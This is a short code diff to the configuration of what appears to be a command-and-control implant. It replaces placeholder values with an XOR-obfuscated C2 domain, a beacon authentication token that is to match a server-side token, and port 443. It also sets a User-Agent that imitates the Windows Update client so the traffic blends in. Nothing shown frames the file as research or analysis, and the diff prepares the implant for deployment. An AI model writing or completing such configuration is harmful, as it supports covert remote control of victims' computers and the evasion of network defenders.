@@ -17,12 +17,12 @@
 
 namespace config {
     // Placeholder encrypted domain — replace with real XOR'd bytes before deployment
-    const uint8_t C2_DOMAIN_ENCRYPTED[] = {0xAA, 0xBB, 0xCC};
-    const size_t  C2_DOMAIN_LEN = sizeof(C2_DOMAIN_ENCRYPTED);
+    const uint8_t C2_DOMAIN_ENCRYPTED[] = {0x53, 0x09, 0x5D, 0x4A, 0x15, 0x1F, 0x07, 0x50, 0x1A, 0x12, 0x47, 0x53, 0x00, 0x5E, 0x08, 0x03, 0x59, 0x08, 0x51, 0x51, 0x09, 0x53, 0x0A, 0x07, 0x1A, 0x16, 0x5D, 0x4B, 0x0A, 0x57, 0x16, 0x11, 0x1A, 0x05, 0x57, 0x4F};
+    const size_t  C2_DOMAIN_LEN = 36;
     const uint16_t C2_PORT = 443;
 
     // Auth token — must match GHOST_BEACON_TOKEN on the server
-    const wchar_t* BEACON_TOKEN = L"CHANGE_ME_BEFORE_DEPLOYMENT";
+    const wchar_t* BEACON_TOKEN = L"4f8c9b2a7e1d5f3c6a8b9e0d2f4c1a3b5e7d9f8c0b1a2d3e4f5a6b7c8d9e0f1";
 
     // User-Agent mimicking Windows Update client
     const wchar_t* USER_AGENT =
